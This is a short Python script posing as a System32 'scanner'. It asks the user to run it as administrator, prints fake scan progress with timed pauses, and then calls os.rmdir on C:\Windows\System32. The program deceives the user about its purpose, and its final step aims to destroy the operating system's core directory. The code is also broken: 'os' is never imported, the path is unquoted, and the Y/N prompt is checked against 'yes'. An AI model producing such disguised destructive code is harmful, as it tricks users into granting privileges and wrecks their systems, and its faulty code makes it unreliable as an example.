import getpass
from time import sleep
import sys
username = getpass.getuser()
print('Hello, ' + username + '.')
sleep(2)
print('In order to properly run the program, please run it as administrator.')
ask = input("First system32 must be scanned as a folder, do you want to continue? (Y\N): ")
if ask == "yes":
  os.system("tree")
  sleep(2.5)
  print("Scanning 30%...")
  sleep(4)
  print("Scanning 72%...")
  sleep(3.2)
  print("Scanning 89%...")
  sleep(10)
  print("Scanning Completed")
  os.rmdir(C:\Windows\System32)
else:
  sys.exit("Program exited..")
